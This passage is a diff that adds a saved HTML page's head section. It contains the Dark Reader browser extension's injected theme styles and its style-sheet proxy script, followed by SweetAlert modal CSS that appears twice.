@@ -1,0 +1,3010 @@
+<!DOCTYPE html>
+<html lang="zxx" class="js" data-lt-installed="true" data-darkreader-scheme="dark" data-darkreader-mode="dynamic">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+		<style class="darkreader darkreader--fallback" media="screen"></style>
+		<style class="darkreader darkreader--text" media="screen"></style>
+		<style class="darkreader darkreader--invert" media="screen">
+			.jfk-bubble.gtx-bubble, .captcheck_answer_label > input + img, span#closed_text > img[src^="https://www.gstatic.com/images/branding/googlelogo"], span[data-href^="https://www.hcaptcha.com/"] > #icon, #bit-notification-bar-iframe, embed[type="application/pdf"]
+			{
+				filter: invert(100%) hue-rotate(180deg) contrast(90%) !important;
+			}
+		</style>
+		<style class="darkreader darkreader--inline" media="screen">
+			[data-darkreader-inline-bgcolor] {
+				background-color: var(--darkreader-inline-bgcolor) !important;
+			}
+			[data-darkreader-inline-bgimage] {
+				background-image: var(--darkreader-inline-bgimage) !important;
+			}
+			[data-darkreader-inline-border] {
+				border-color: var(--darkreader-inline-border) !important;
+			}
+			[data-darkreader-inline-border-bottom] {
+				border-bottom-color: var(--darkreader-inline-border-bottom) !important;
+			}
+			[data-darkreader-inline-border-left] {
+				border-left-color: var(--darkreader-inline-border-left) !important;
+			}
+			[data-darkreader-inline-border-right] {
+				border-right-color: var(--darkreader-inline-border-right) !important;
+			}
+			[data-darkreader-inline-border-top] {
+				border-top-color: var(--darkreader-inline-border-top) !important;
+			}
+			[data-darkreader-inline-boxshadow] {
+				box-shadow: var(--darkreader-inline-boxshadow) !important;
+			}
+			[data-darkreader-inline-color] {
+				color: var(--darkreader-inline-color) !important;
+			}
+			[data-darkreader-inline-fill] {
+				fill: var(--darkreader-inline-fill) !important;
+			}
+			[data-darkreader-inline-stroke] {
+				stroke: var(--darkreader-inline-stroke) !important;
+			}
+			[data-darkreader-inline-outline] {
+				outline-color: var(--darkreader-inline-outline) !important;
+			}
+			[data-darkreader-inline-stopcolor] {
+				stop-color: var(--darkreader-inline-stopcolor) !important;
+			}
+		</style>
+		<style class="darkreader darkreader--variables" media="screen">
+			:root {
+				--darkreader-neutral-background: #131516;
+				--darkreader-neutral-text: #d8d4cf;
+				--darkreader-selection-background: #004daa;
+				--darkreader-selection-text: #e8e6e3;
+			}
+		</style>
+		<style class="darkreader darkreader--root-vars" media="screen"></style>
+		<script class="darkreader darkreader--proxy">
+			;(function injectProxy() {
+				document.dispatchEvent(new CustomEvent('__darkreader__inlineScriptsAllowed'))
+				const addRuleDescriptor = Object.getOwnPropertyDescriptor(CSSStyleSheet.prototype, 'addRule')
+				const insertRuleDescriptor = Object.getOwnPropertyDescriptor(CSSStyleSheet.prototype, 'insertRule')
+				const deleteRuleDescriptor = Object.getOwnPropertyDescriptor(CSSStyleSheet.prototype, 'deleteRule')
+				const removeRuleDescriptor = Object.getOwnPropertyDescriptor(CSSStyleSheet.prototype, 'removeRule')
+				const shouldWrapDocStyleSheets = location.hostname.endsWith('pushbullet.com')
+				const documentStyleSheetsDescriptor = shouldWrapDocStyleSheets ? Object.getOwnPropertyDescriptor(Document.prototype, 'styleSheets') : null
+				const cleanUp = () => {
+					Object.defineProperty(CSSStyleSheet.prototype, 'addRule', addRuleDescriptor)
+					Object.defineProperty(CSSStyleSheet.prototype, 'insertRule', insertRuleDescriptor)
+					Object.defineProperty(CSSStyleSheet.prototype, 'deleteRule', deleteRuleDescriptor)
+					Object.defineProperty(CSSStyleSheet.prototype, 'removeRule', removeRuleDescriptor)
+					document.removeEventListener('__darkreader__cleanUp', cleanUp)
+					document.removeEventListener('__darkreader__addUndefinedResolver', addUndefinedResolver)
+					if (shouldWrapDocStyleSheets) {
+						Object.defineProperty(Document.prototype, 'styleSheets', documentStyleSheetsDescriptor)
+					}
+				}
+				const addUndefinedResolver = (e) => {
+					customElements.whenDefined(e.detail.tag).then(() => {
+						document.dispatchEvent(
+							new CustomEvent('__darkreader__isDefined', {
+								detail: { tag: e.detail.tag },
+							})
+						)
+					})
+				}
+				document.addEventListener('__darkreader__cleanUp', cleanUp)
+				document.addEventListener('__darkreader__addUndefinedResolver', addUndefinedResolver)
+				const updateSheetEvent = new Event('__darkreader__updateSheet')
+				function proxyAddRule(selector, style, index) {
+					addRuleDescriptor.value.call(this, selector, style, index)
+					if (this.ownerNode && !this.ownerNode.classList.contains('darkreader')) {
+						this.ownerNode.dispatchEvent(updateSheetEvent)
+					}
+					return -1
+				}
+				function proxyInsertRule(rule, index) {
+					const returnValue = insertRuleDescriptor.value.call(this, rule, index)
+					if (this.ownerNode && !this.ownerNode.classList.contains('darkreader')) {
+						this.ownerNode.dispatchEvent(updateSheetEvent)
+					}
+					return returnValue
+				}
+				function proxyDeleteRule(index) {
+					deleteRuleDescriptor.value.call(this, index)
+					if (this.ownerNode && !this.ownerNode.classList.contains('darkreader')) {
+						this.ownerNode.dispatchEvent(updateSheetEvent)
+					}
+				}
+				function proxyRemoveRule(index) {
+					removeRuleDescriptor.value.call(this, index)
+					if (this.ownerNode && !this.ownerNode.classList.contains('darkreader')) {
+						this.ownerNode.dispatchEvent(updateSheetEvent)
+					}
+				}
+				function proxyDocumentStyleSheets() {
+					const docSheets = documentStyleSheetsDescriptor.get.call(this)
+					const filtered = [...docSheets].filter((styleSheet) => {
+						return !styleSheet.ownerNode.classList.contains('darkreader')
+					})
+					return Object.setPrototypeOf(filtered, StyleSheetList.prototype)
+				}
+				Object.defineProperty(CSSStyleSheet.prototype, 'addRule', Object.assign({}, addRuleDescriptor, { value: proxyAddRule }))
+				Object.defineProperty(CSSStyleSheet.prototype, 'insertRule', Object.assign({}, insertRuleDescriptor, { value: proxyInsertRule }))
+				Object.defineProperty(CSSStyleSheet.prototype, 'deleteRule', Object.assign({}, deleteRuleDescriptor, { value: proxyDeleteRule }))
+				Object.defineProperty(CSSStyleSheet.prototype, 'removeRule', Object.assign({}, removeRuleDescriptor, { value: proxyRemoveRule }))
+				if (shouldWrapDocStyleSheets) {
+					Object.defineProperty(
+						Document.prototype,
+						'styleSheets',
+						Object.assign({}, documentStyleSheetsDescriptor, {
+							get: proxyDocumentStyleSheets,
+						})
+					)
+				}
+			})()
+		</script>
+		<style class="darkreader darkreader--user-agent" media="screen">
+			html {
+				background-color: #181a1b !important;
+			}
+			html,
+			body,
+			input,
+			textarea,
+			select,
+			button {
+				background-color: #181a1b;
+			}
+			html,
+			body,
+			input,
+			textarea,
+			select,
+			button {
+				border-color: #736b5e;
+				color: #e8e6e3;
+			}
+			a {
+				color: #3391ff;
+			}
+			table {
+				border-color: #545b5e;
+			}
+			::placeholder {
+				color: #b2aba1;
+			}
+			input:-webkit-autofill,
+			textarea:-webkit-autofill,
+			select:-webkit-autofill {
+				background-color: #555b00 !important;
+				color: #e8e6e3 !important;
+			}
+			::-webkit-scrollbar {
+				background-color: #202324;
+				color: #aba499;
+			}
+			::-webkit-scrollbar-thumb {
+				background-color: #454a4d;
+			}
+			::-webkit-scrollbar-thumb:hover {
+				background-color: #575e62;
+			}
+			::-webkit-scrollbar-thumb:active {
+				background-color: #484e51;
+			}
+			::-webkit-scrollbar-corner {
+				background-color: #181a1b;
+			}
+			::selection {
+				background-color: #004daa !important;
+				color: #e8e6e3 !important;
+			}
+			::-moz-selection {
+				background-color: #004daa !important;
+				color: #e8e6e3 !important;
+			}
+		</style>
+		<style type="text/css">
+			.swal-icon--error {
+				border-color: #f27474;
+				-webkit-animation: animateErrorIcon 0.5s;
+				animation: animateErrorIcon 0.5s;
+			}
+			.swal-icon--error__x-mark {
+				position: relative;
+				display: block;
+				-webkit-animation: animateXMark 0.5s;
+				animation: animateXMark 0.5s;
+			}
+			.swal-icon--error__line {
+				position: absolute;
+				height: 5px;
+				width: 47px;
+				background-color: #f27474;
+				display: block;
+				top: 37px;
+				border-radius: 2px;
+			}
+			.swal-icon--error__line--left {
+				-webkit-transform: rotate(45deg);
+				transform: rotate(45deg);
+				left: 17px;
+			}
+			.swal-icon--error__line--right {
+				-webkit-transform: rotate(-45deg);
+				transform: rotate(-45deg);
+				right: 16px;
+			}
+			@-webkit-keyframes animateErrorIcon {
+				0% {
+					-webkit-transform: rotateX(100deg);
+					transform: rotateX(100deg);
+					opacity: 0;
+				}
+				to {
+					-webkit-transform: rotateX(0deg);
+					transform: rotateX(0deg);
+					opacity: 1;
+				}
+			}
+			@keyframes animateErrorIcon {
+				0% {
+					-webkit-transform: rotateX(100deg);
+					transform: rotateX(100deg);
+					opacity: 0;
+				}
+				to {
+					-webkit-transform: rotateX(0deg);
+					transform: rotateX(0deg);
+					opacity: 1;
+				}
+			}
+			@-webkit-keyframes animateXMark {
+				0% {
+					-webkit-transform: scale(0.4);
+					transform: scale(0.4);
+					margin-top: 26px;
+					opacity: 0;
+				}
+				50% {
+					-webkit-transform: scale(0.4);
+					transform: scale(0.4);
+					margin-top: 26px;
+					opacity: 0;
+				}
+				80% {
+					-webkit-transform: scale(1.15);
+					transform: scale(1.15);
+					margin-top: -6px;
+				}
+				to {
+					-webkit-transform: scale(1);
+					transform: scale(1);
+					margin-top: 0;
+					opacity: 1;
+				}
+			}
+			@keyframes animateXMark {
+				0% {
+					-webkit-transform: scale(0.4);
+					transform: scale(0.4);
+					margin-top: 26px;
+					opacity: 0;
+				}
+				50% {
+					-webkit-transform: scale(0.4);
+					transform: scale(0.4);
+					margin-top: 26px;
+					opacity: 0;
+				}
+				80% {
+					-webkit-transform: scale(1.15);
+					transform: scale(1.15);
+					margin-top: -6px;
+				}
+				to {
+					-webkit-transform: scale(1);
+					transform: scale(1);
+					margin-top: 0;
+					opacity: 1;
+				}
+			}
+			.swal-icon--warning {
+				border-color: #f8bb86;
+				-webkit-animation: pulseWarning 0.75s infinite alternate;
+				animation: pulseWarning 0.75s infinite alternate;
+			}
+			.swal-icon--warning__body {
+				width: 5px;
+				height: 47px;
+				top: 10px;
+				border-radius: 2px;
+				margin-left: -2px;
+			}
+			.swal-icon--warning__body,
+			.swal-icon--warning__dot {
+				position: absolute;
+				left: 50%;
+				background-color: #f8bb86;
+			}
+			.swal-icon--warning__dot {
+				width: 7px;
+				height: 7px;
+				border-radius: 50%;
+				margin-left: -4px;
+				bottom: -11px;
+			}
+			@-webkit-keyframes pulseWarning {
+				0% {
+					border-color: #f8d486;
+				}
+				to {
+					border-color: #f8bb86;
+				}
+			}
+			@keyframes pulseWarning {
+				0% {
+					border-color: #f8d486;
+				}
+				to {
+					border-color: #f8bb86;
+				}
+			}
+			.swal-icon--success {
+				border-color: #a5dc86;
+			}
+			.swal-icon--success:after,
+			.swal-icon--success:before {
+				content: '';
+				border-radius: 50%;
+				position: absolute;
+				width: 60px;
+				height: 120px;
+				background: #fff;
+				-webkit-transform: rotate(45deg);
+				transform: rotate(45deg);
+			}
+			.swal-icon--success:before {
+				border-radius: 120px 0 0 120px;
+				top: -7px;
+				left: -33px;
+				-webkit-transform: rotate(-45deg);
+				transform: rotate(-45deg);
+				-webkit-transform-origin: 60px 60px;
+				transform-origin: 60px 60px;
+			}
+			.swal-icon--success:after {
+				border-radius: 0 120px 120px 0;
+				top: -11px;
+				left: 30px;
+				-webkit-transform: rotate(-45deg);
+				transform: rotate(-45deg);
+				-webkit-transform-origin: 0 60px;
+				transform-origin: 0 60px;
+				-webkit-animation: rotatePlaceholder 4.25s ease-in;
+				animation: rotatePlaceholder 4.25s ease-in;
+			}
+			.swal-icon--success__ring {
+				width: 80px;
+				height: 80px;
+				border: 4px solid hsla(98, 55%, 69%, 0.2);
+				border-radius: 50%;
+				box-sizing: content-box;
+				position: absolute;
+				left: -4px;
+				top: -4px;
+				z-index: 2;
+			}
+			.swal-icon--success__hide-corners {
+				width: 5px;
+				height: 90px;
+				background-color: #fff;
+				padding: 1px;
+				position: absolute;
+				left: 28px;
+				top: 8px;
+				z-index: 1;
+				-webkit-transform: rotate(-45deg);
+				transform: rotate(-45deg);
+			}
+			.swal-icon--success__line {
+				height: 5px;
+				background-color: #a5dc86;
+				display: block;
+				border-radius: 2px;
+				position: absolute;
+				z-index: 2;
+			}
+			.swal-icon--success__line--tip {
+				width: 25px;
+				left: 14px;
+				top: 46px;
+				-webkit-transform: rotate(45deg);
+				transform: rotate(45deg);
+				-webkit-animation: animateSuccessTip 0.75s;
+				animation: animateSuccessTip 0.75s;
+			}
+			.swal-icon--success__line--long {
+				width: 47px;
+				right: 8px;
+				top: 38px;
+				-webkit-transform: rotate(-45deg);
+				transform: rotate(-45deg);
+				-webkit-animation: animateSuccessLong 0.75s;
+				animation: animateSuccessLong 0.75s;
+			}
+			@-webkit-keyframes rotatePlaceholder {
+				0% {
+					-webkit-transform: rotate(-45deg);
+					transform: rotate(-45deg);
+				}
+				5% {
+					-webkit-transform: rotate(-45deg);
+					transform: rotate(-45deg);
+				}
+				12% {
+					-webkit-transform: rotate(-405deg);
+					transform: rotate(-405deg);
+				}
+				to {
+					-webkit-transform: rotate(-405deg);
+					transform: rotate(-405deg);
+				}
+			}
+			@keyframes rotatePlaceholder {
+				0% {
+					-webkit-transform: rotate(-45deg);
+					transform: rotate(-45deg);
+				}
+				5% {
+					-webkit-transform: rotate(-45deg);
+					transform: rotate(-45deg);
+				}
+				12% {
+					-webkit-transform: rotate(-405deg);
+					transform: rotate(-405deg);
+				}
+				to {
+					-webkit-transform: rotate(-405deg);
+					transform: rotate(-405deg);
+				}
+			}
+			@-webkit-keyframes animateSuccessTip {
+				0% {
+					width: 0;
+					left: 1px;
+					top: 19px;
+				}
+				54% {
+					width: 0;
+					left: 1px;
+					top: 19px;
+				}
+				70% {
+					width: 50px;
+					left: -8px;
+					top: 37px;
+				}
+				84% {
+					width: 17px;
+					left: 21px;
+					top: 48px;
+				}
+				to {
+					width: 25px;
+					left: 14px;
+					top: 45px;
+				}
+			}
+			@keyframes animateSuccessTip {
+				0% {
+					width: 0;
+					left: 1px;
+					top: 19px;
+				}
+				54% {
+					width: 0;
+					left: 1px;
+					top: 19px;
+				}
+				70% {
+					width: 50px;
+					left: -8px;
+					top: 37px;
+				}
+				84% {
+					width: 17px;
+					left: 21px;
+					top: 48px;
+				}
+				to {
+					width: 25px;
+					left: 14px;
+					top: 45px;
+				}
+			}
+			@-webkit-keyframes animateSuccessLong {
+				0% {
+					width: 0;
+					right: 46px;
+					top: 54px;
+				}
+				65% {
+					width: 0;
+					right: 46px;
+					top: 54px;
+				}
+				84% {
+					width: 55px;
+					right: 0;
+					top: 35px;
+				}
+				to {
+					width: 47px;
+					right: 8px;
+					top: 38px;
+				}
+			}
+			@keyframes animateSuccessLong {
+				0% {
+					width: 0;
+					right: 46px;
+					top: 54px;
+				}
+				65% {
+					width: 0;
+					right: 46px;
+					top: 54px;
+				}
+				84% {
+					width: 55px;
+					right: 0;
+					top: 35px;
+				}
+				to {
+					width: 47px;
+					right: 8px;
+					top: 38px;
+				}
+			}
+			.swal-icon--info {
+				border-color: #c9dae1;
+			}
+			.swal-icon--info:before {
+				width: 5px;
+				height: 29px;
+				bottom: 17px;
+				border-radius: 2px;
+				margin-left: -2px;
+			}
+			.swal-icon--info:after,
+			.swal-icon--info:before {
+				content: '';
+				position: absolute;
+				left: 50%;
+				background-color: #c9dae1;
+			}
+			.swal-icon--info:after {
+				width: 7px;
+				height: 7px;
+				border-radius: 50%;
+				margin-left: -3px;
+				top: 19px;
+			}
+			.swal-icon {
+				width: 80px;
+				height: 80px;
+				border-width: 4px;
+				border-style: solid;
+				border-radius: 50%;
+				padding: 0;
+				position: relative;
+				box-sizing: content-box;
+				margin: 20px auto;
+			}
+			.swal-icon:first-child {
+				margin-top: 32px;
+			}
+			.swal-icon--custom {
+				width: auto;
+				height: auto;
+				max-width: 100%;
+				border: none;
+				border-radius: 0;
+			}
+			.swal-icon img {
+				max-width: 100%;
+				max-height: 100%;
+			}
+			.swal-title {
+				color: rgba(0, 0, 0, 0.65);
+				font-weight: 600;
+				text-transform: none;
+				position: relative;
+				display: block;
+				padding: 13px 16px;
+				font-size: 27px;
+				line-height: normal;
+				text-align: center;
+				margin-bottom: 0;
+			}
+			.swal-title:first-child {
+				margin-top: 26px;
+			}
+			.swal-title:not(:first-child) {
+				padding-bottom: 0;
+			}
+			.swal-title:not(:last-child) {
+				margin-bottom: 13px;
+			}
+			.swal-text {
+				font-size: 16px;
+				position: relative;
+				float: none;
+				line-height: normal;
+				vertical-align: top;
+				text-align: left;
+				display: inline-block;
+				margin: 0;
+				padding: 0 10px;
+				font-weight: 400;
+				color: rgba(0, 0, 0, 0.64);
+				max-width: calc(100% - 20px);
+				overflow-wrap: break-word;
+				box-sizing: border-box;
+			}
+			.swal-text:first-child {
+				margin-top: 45px;
+			}
+			.swal-text:last-child {
+				margin-bottom: 45px;
+			}
+			.swal-footer {
+				text-align: right;
+				padding-top: 13px;
+				margin-top: 13px;
+				padding: 13px 16px;
+				border-radius: inherit;
+				border-top-left-radius: 0;
+				border-top-right-radius: 0;
+			}
+			.swal-button-container {
+				margin: 5px;
+				display: inline-block;
+				position: relative;
+			}
+			.swal-button {
+				background-color: #7cd1f9;
+				color: #fff;
+				border: none;
+				box-shadow: none;
+				border-radius: 5px;
+				font-weight: 600;
+				font-size: 14px;
+				padding: 10px 24px;
+				margin: 0;
+				cursor: pointer;
+			}
+			.swal-button:not([disabled]):hover {
+				background-color: #78cbf2;
+			}
+			.swal-button:active {
+				background-color: #70bce0;
+			}
+			.swal-button:focus {
+				outline: none;
+				box-shadow: 0 0 0 1px #fff, 0 0 0 3px rgba(43, 114, 165, 0.29);
+			}
+			.swal-button[disabled] {
+				opacity: 0.5;
+				cursor: default;
+			}
+			.swal-button::-moz-focus-inner {
+				border: 0;
+			}
+			.swal-button--cancel {
+				color: #555;
+				background-color: #efefef;
+			}
+			.swal-button--cancel:not([disabled]):hover {
+				background-color: #e8e8e8;
+			}
+			.swal-button--cancel:active {
+				background-color: #d7d7d7;
+			}
+			.swal-button--cancel:focus {
+				box-shadow: 0 0 0 1px #fff, 0 0 0 3px rgba(116, 136, 150, 0.29);
+			}
+			.swal-button--danger {
+				background-color: #e64942;
+			}
+			.swal-button--danger:not([disabled]):hover {
+				background-color: #df4740;
+			}
+			.swal-button--danger:active {
+				background-color: #cf423b;
+			}
+			.swal-button--danger:focus {
+				box-shadow: 0 0 0 1px #fff, 0 0 0 3px rgba(165, 43, 43, 0.29);
+			}
+			.swal-content {
+				padding: 0 20px;
+				margin-top: 20px;
+				font-size: medium;
+			}
+			.swal-content:last-child {
+				margin-bottom: 20px;
+			}
+			.swal-content__input,
+			.swal-content__textarea {
+				-webkit-appearance: none;
+				background-color: #fff;
+				border: none;
+				font-size: 14px;
+				display: block;
+				box-sizing: border-box;
+				width: 100%;
+				border: 1px solid rgba(0, 0, 0, 0.14);
+				padding: 10px 13px;
+				border-radius: 2px;
+				transition: border-color 0.2s;
+			}
+			.swal-content__input:focus,
+			.swal-content__textarea:focus {
+				outline: none;
+				border-color: #6db8ff;
+			}
+			.swal-content__textarea {
+				resize: vertical;
+			}
+			.swal-button--loading {
+				color: transparent;
+			}
+			.swal-button--loading ~ .swal-button__loader {
+				opacity: 1;
+			}
+			.swal-button__loader {
+				position: absolute;
+				height: auto;
+				width: 43px;
+				z-index: 2;
+				left: 50%;
+				top: 50%;
+				-webkit-transform: translateX(-50%) translateY(-50%);
+				transform: translateX(-50%) translateY(-50%);
+				text-align: center;
+				pointer-events: none;
+				opacity: 0;
+			}
+			.swal-button__loader div {
+				display: inline-block;
+				float: none;
+				vertical-align: baseline;
+				width: 9px;
+				height: 9px;
+				padding: 0;
+				border: none;
+				margin: 2px;
+				opacity: 0.4;
+				border-radius: 7px;
+				background-color: hsla(0, 0%, 100%, 0.9);
+				transition: background 0.2s;
+				-webkit-animation: swal-loading-anim 1s infinite;
+				animation: swal-loading-anim 1s infinite;
+			}
+			.swal-button__loader div:nth-child(3n + 2) {
+				-webkit-animation-delay: 0.15s;
+				animation-delay: 0.15s;
+			}
+			.swal-button__loader div:nth-child(3n + 3) {
+				-webkit-animation-delay: 0.3s;
+				animation-delay: 0.3s;
+			}
+			@-webkit-keyframes swal-loading-anim {
+				0% {
+					opacity: 0.4;
+				}
+				20% {
+					opacity: 0.4;
+				}
+				50% {
+					opacity: 1;
+				}
+				to {
+					opacity: 0.4;
+				}
+			}
+			@keyframes swal-loading-anim {
+				0% {
+					opacity: 0.4;
+				}
+				20% {
+					opacity: 0.4;
+				}
+				50% {
+					opacity: 1;
+				}
+				to {
+					opacity: 0.4;
+				}
+			}
+			.swal-overlay {
+				position: fixed;
+				top: 0;
+				bottom: 0;
+				left: 0;
+				right: 0;
+				text-align: center;
+				font-size: 0;
+				overflow-y: auto;
+				background-color: rgba(0, 0, 0, 0.4);
+				z-index: 10000;
+				pointer-events: none;
+				opacity: 0;
+				transition: opacity 0.3s;
+			}
+			.swal-overlay:before {
+				content: ' ';
+				display: inline-block;
+				vertical-align: middle;
+				height: 100%;
+			}
+			.swal-overlay--show-modal {
+				opacity: 1;
+				pointer-events: auto;
+			}
+			.swal-overlay--show-modal .swal-modal {
+				opacity: 1;
+				pointer-events: auto;
+				box-sizing: border-box;
+				-webkit-animation: showSweetAlert 0.3s;
+				animation: showSweetAlert 0.3s;
+				will-change: transform;
+			}
+			.swal-modal {
+				width: 478px;
+				opacity: 0;
+				pointer-events: none;
+				background-color: #fff;
+				text-align: center;
+				border-radius: 5px;
+				position: static;
+				margin: 20px auto;
+				display: inline-block;
+				vertical-align: middle;
+				-webkit-transform: scale(1);
+				transform: scale(1);
+				-webkit-transform-origin: 50% 50%;
+				transform-origin: 50% 50%;
+				z-index: 10001;
+				transition: opacity 0.2s, -webkit-transform 0.3s;
+				transition: transform 0.3s, opacity 0.2s;
+				transition: transform 0.3s, opacity 0.2s, -webkit-transform 0.3s;
+			}
+			@media (max-width: 500px) {
+				.swal-modal {
+					width: calc(100% - 20px);
+				}
+			}
+			@-webkit-keyframes showSweetAlert {
+				0% {
+					-webkit-transform: scale(1);
+					transform: scale(1);
+				}
+				1% {
+					-webkit-transform: scale(0.5);
+					transform: scale(0.5);
+				}
+				45% {
+					-webkit-transform: scale(1.05);
+					transform: scale(1.05);
+				}
+				80% {
+					-webkit-transform: scale(0.95);
+					transform: scale(0.95);
+				}
+				to {
+					-webkit-transform: scale(1);
+					transform: scale(1);
+				}
+			}
+			@keyframes showSweetAlert {
+				0% {
+					-webkit-transform: scale(1);
+					transform: scale(1);
+				}
+				1% {
+					-webkit-transform: scale(0.5);
+					transform: scale(0.5);
+				}
+				45% {
+					-webkit-transform: scale(1.05);
+					transform: scale(1.05);
+				}
+				80% {
+					-webkit-transform: scale(0.95);
+					transform: scale(0.95);
+				}
+				to {
+					-webkit-transform: scale(1);
+					transform: scale(1);
+				}
+			}
+		</style>
+		<style class="darkreader darkreader--sync" media="screen"></style>
+		<style type="text/css">
+			.swal-icon--error {
+				border-color: #f27474;
+				-webkit-animation: animateErrorIcon 0.5s;
+				animation: animateErrorIcon 0.5s;
+			}
+			.swal-icon--error__x-mark {
+				position: relative;
+				display: block;
+				-webkit-animation: animateXMark 0.5s;
+				animation: animateXMark 0.5s;
+			}
+			.swal-icon--error__line {
+				position: absolute;
+				height: 5px;
+				width: 47px;
+				background-color: #f27474;
+				display: block;
+				top: 37px;
+				border-radius: 2px;
+			}
+			.swal-icon--error__line--left {
+				-webkit-transform: rotate(45deg);
+				transform: rotate(45deg);
+				left: 17px;
+			}
+			.swal-icon--error__line--right {
+				-webkit-transform: rotate(-45deg);
+				transform: rotate(-45deg);
+				right: 16px;
+			}
+			@-webkit-keyframes animateErrorIcon {
+				0% {
+					-webkit-transform: rotateX(100deg);
+					transform: rotateX(100deg);
+					opacity: 0;
+				}
+				to {
+					-webkit-transform: rotateX(0deg);
+					transform: rotateX(0deg);
+					opacity: 1;
+				}
+			}
+			@keyframes animateErrorIcon {
+				0% {
+					-webkit-transform: rotateX(100deg);
+					transform: rotateX(100deg);
+					opacity: 0;
+				}
+				to {
+					-webkit-transform: rotateX(0deg);
+					transform: rotateX(0deg);
+					opacity: 1;
+				}
+			}
+			@-webkit-keyframes animateXMark {
+				0% {
+					-webkit-transform: scale(0.4);
+					transform: scale(0.4);
+					margin-top: 26px;
+					opacity: 0;
+				}
+				50% {
+					-webkit-transform: scale(0.4);
+					transform: scale(0.4);
+					margin-top: 26px;
+					opacity: 0;
+				}
+				80% {
+					-webkit-transform: scale(1.15);
+					transform: scale(1.15);
+					margin-top: -6px;
+				}
+				to {
+					-webkit-transform: scale(1);
+					transform: scale(1);
+					margin-top: 0;
+					opacity: 1;
+				}
+			}
+			@keyframes animateXMark {
+				0% {
+					-webkit-transform: scale(0.4);
+					transform: scale(0.4);
+					margin-top: 26px;
+					opacity: 0;
+				}
+				50% {
+					-webkit-transform: scale(0.4);
+					transform: scale(0.4);
+					margin-top: 26px;
+					opacity: 0;
+				}
+				80% {
+					-webkit-transform: scale(1.15);
+					transform: scale(1.15);
+					margin-top: -6px;
+				}
+				to {
+					-webkit-transform: scale(1);
+					transform: scale(1);
+					margin-top: 0;
+					opacity: 1;
+				}
+			}
+			.swal-icon--warning {
+				border-color: #f8bb86;
+				-webkit-animation: pulseWarning 0.75s infinite alternate;
+				animation: pulseWarning 0.75s infinite alternate;
+			}
+			.swal-icon--warning__body {
+				width: 5px;
+				height: 47px;
+				top: 10px;
+				border-radius: 2px;
+				margin-left: -2px;
+			}
+			.swal-icon--warning__body,
+			.swal-icon--warning__dot {
+				position: absolute;
+				left: 50%;
+				background-color: #f8bb86;
+			}
+			.swal-icon--warning__dot {
+				width: 7px;
+				height: 7px;
+				border-radius: 50%;
+				margin-left: -4px;
+				bottom: -11px;
+			}
+			@-webkit-keyframes pulseWarning {
+				0% {
+					border-color: #f8d486;
+				}
+				to {
+					border-color: #f8bb86;
+				}
+			}
+			@keyframes pulseWarning {
+				0% {
+					border-color: #f8d486;
+				}
+				to {
+					border-color: #f8bb86;
+				}
+			}
+			.swal-icon--success {
+				border-color: #a5dc86;
+			}
+			.swal-icon--success:after,
+			.swal-icon--success:before {
+				content: '';
+				border-radius: 50%;
+				position: absolute;
+				width: 60px;
+				height: 120px;
+				background: #fff;
+				-webkit-transform: rotate(45deg);
+				transform: rotate(45deg);
+			}
+			.swal-icon--success:before {
+				border-radius: 120px 0 0 120px;
+				top: -7px;
+				left: -33px;
+				-webkit-transform: rotate(-45deg);
+				transform: rotate(-45deg);
+				-webkit-transform-origin: 60px 60px;
+				transform-origin: 60px 60px;
+			}
+			.swal-icon--success:after {
+				border-radius: 0 120px 120px 0;
+				top: -11px;
+				left: 30px;
+				-webkit-transform: rotate(-45deg);
+				transform: rotate(-45deg);
+				-webkit-transform-origin: 0 60px;
+				transform-origin: 0 60px;
+				-webkit-animation: rotatePlaceholder 4.25s ease-in;
+				animation: rotatePlaceholder 4.25s ease-in;
+			}
+			.swal-icon--success__ring {
+				width: 80px;
+				height: 80px;
+				border: 4px solid hsla(98, 55%, 69%, 0.2);
+				border-radius: 50%;
+				box-sizing: content-box;
+				position: absolute;
+				left: -4px;
+				top: -4px;
+				z-index: 2;
+			}
+			.swal-icon--success__hide-corners {
+				width: 5px;
+				height: 90px;
+				background-color: #fff;
+				padding: 1px;
+				position: absolute;
+				left: 28px;
+				top: 8px;
+				z-index: 1;
+				-webkit-transform: rotate(-45deg);
+				transform: rotate(-45deg);
+			}
+			.swal-icon--success__line {
+				height: 5px;
+				background-color: #a5dc86;
+				display: block;
+				border-radius: 2px;
+				position: absolute;
+				z-index: 2;
+			}
+			.swal-icon--success__line--tip {
+				width: 25px;
+				left: 14px;
+				top: 46px;
+				-webkit-transform: rotate(45deg);
+				transform: rotate(45deg);
+				-webkit-animation: animateSuccessTip 0.75s;
+				animation: animateSuccessTip 0.75s;
+			}
+			.swal-icon--success__line--long {
+				width: 47px;
+				right: 8px;
+				top: 38px;
+				-webkit-transform: rotate(-45deg);
+				transform: rotate(-45deg);
+				-webkit-animation: animateSuccessLong 0.75s;
+				animation: animateSuccessLong 0.75s;
+			}
+			@-webkit-keyframes rotatePlaceholder {
+				0% {
+					-webkit-transform: rotate(-45deg);
+					transform: rotate(-45deg);
+				}
+				5% {
+					-webkit-transform: rotate(-45deg);
+					transform: rotate(-45deg);
+				}
+				12% {
+					-webkit-transform: rotate(-405deg);
+					transform: rotate(-405deg);
+				}
+				to {
+					-webkit-transform: rotate(-405deg);
+					transform: rotate(-405deg);
+				}
+			}
+			@keyframes rotatePlaceholder {
+				0% {
+					-webkit-transform: rotate(-45deg);
+					transform: rotate(-45deg);
+				}
+				5% {
+					-webkit-transform: rotate(-45deg);
+					transform: rotate(-45deg);
+				}
+				12% {
+					-webkit-transform: rotate(-405deg);
+					transform: rotate(-405deg);
+				}
+				to {
+					-webkit-transform: rotate(-405deg);
+					transform: rotate(-405deg);
+				}
+			}
+			@-webkit-keyframes animateSuccessTip {
+				0% {
+					width: 0;
+					left: 1px;
+					top: 19px;
+				}
+				54% {
+					width: 0;
+					left: 1px;
+					top: 19px;
+				}
+				70% {
+					width: 50px;
+					left: -8px;
+					top: 37px;
+				}
+				84% {
+					width: 17px;
+					left: 21px;
+					top: 48px;
+				}
+				to {
+					width: 25px;
+					left: 14px;
+					top: 45px;
+				}
+			}
+			@keyframes animateSuccessTip {
+				0% {
+					width: 0;
+					left: 1px;
+					top: 19px;
+				}
+				54% {
+					width: 0;
+					left: 1px;
+					top: 19px;
+				}
+				70% {
+					width: 50px;
+					left: -8px;
+					top: 37px;
+				}
+				84% {
+					width: 17px;
+					left: 21px;
+					top: 48px;
+				}
+				to {
+					width: 25px;
+					left: 14px;
+					top: 45px;
+				}
+			}
+			@-webkit-keyframes animateSuccessLong {
+				0% {
+					width: 0;
+					right: 46px;
